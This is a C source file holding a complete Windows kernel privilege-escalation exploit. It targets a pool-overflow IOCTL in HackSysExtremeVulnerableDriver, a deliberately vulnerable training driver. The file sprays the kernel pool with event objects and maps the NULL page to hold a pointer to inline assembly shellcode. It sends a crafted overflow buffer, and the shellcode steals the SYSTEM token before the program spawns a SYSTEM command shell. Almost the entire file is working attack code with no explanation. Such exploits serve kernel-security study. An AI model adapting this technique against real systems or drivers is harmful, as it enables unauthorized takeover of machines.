#include<Windows.h>
#include<stdio.h>

#define IOCTL_OPCODE 0x22200F

HANDLE PoolObject[0x1000];

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

__declspec(naked) void ShellCode(){
    __asm{
        pushad ;save
        xor eax, eax

        mov eax, fs:[eax + 0x124]
        mov eax, [eax + 0x40]
        mov eax, [eax + 0x10] ;current process
        mov ecx, eax

        SearchSystemPid:
            mov eax, [eax + 0xb8]
            sub eax, 0xb8
            cmp [eax + 0xb4], 0x4
            jne SearchSystemPid
        
            mov eax, [eax + 0xf8]
            mov [ecx + 0xf8], eax

            popad
            mov eax, 1
            ret 4


    }
}

HANDLE Get_Device_Handle(LPCTSTR lpFileName)
{

    HANDLE hDevice = CreateFileW(lpFileName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE, 
         NULL, 
         OPEN_EXISTING, 
         0, 
         NULL);
    if(hDevice == INVALID_HANDLE_VALUE){
        printf("[-] Failed to get device handle. Error code: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Successfully got device handle[%d].\n", hDevice);
    return hDevice;
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

void PoolSpray(){

    for(int i = 0; i < 0x1000; i++){
        PoolObject[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
    }

    for(int i = 0; i < 0x1000; i++){
        for(int j = 0; j < 8; j++){
            CloseHandle(PoolObject[i + j]);
        }
        i = i + 8;
    }

}

int main(){

    HANDLE hDevice = Get_Device_Handle(L"\\\\.\\HackSysExtremeVulnerableDriver");

    DWORD bytesReturned = 0;
    char input_buffer[0x220] = {'0'};
    char output_buffer[0x80] = {'0'};

    memset(input_buffer, 'A', 0x1f8);

    *(int *)(input_buffer + 0x1f8) = 0x04080040;
    *(int *)(input_buffer + 0x1fc) = 0xee657645;
    *(int *)(input_buffer + 0x200) = 0x00000000;
    *(int *)(input_buffer + 0x204) = 0x00000040;
    *(int *)(input_buffer + 0x208) = 0x00000000;
    *(int *)(input_buffer + 0x20c) = 0x00000000;
    *(int *)(input_buffer + 0x210) = 0x00000001;
    *(int *)(input_buffer + 0x214) = 0x00000001;
    *(int *)(input_buffer + 0x218) = 0x00000000;
    *(int *)(input_buffer + 0x21c) = 0x00080000;

    PVOID zero_addr = (PVOID)1;
    size_t RegionSize = 0x1000;

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;

	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

    NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &zero_addr, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    *(DWORD *)0x60 = (DWORD)&ShellCode;

    PoolSpray();

    BOOL result = DeviceIoControl(hDevice, IOCTL_OPCODE, input_buffer, (DWORD)sizeof(input_buffer), output_buffer, (DWORD)sizeof(output_buffer), &bytesReturned, NULL);

    if (result) {
    printf("[+] IOCTL request sent successfully. Bytes returned: %d\n", bytesReturned);
    }
    else {
    printf("[-] Failed to send IOCTL request. Error code: %d\n", GetLastError());
    }

    for (int i = 0; i < 0x1000; i++){
		if (PoolObject[i]) CloseHandle(PoolObject[i]);
	}

    CreateCmd();

    CloseHandle(hDevice);
    return 0;
}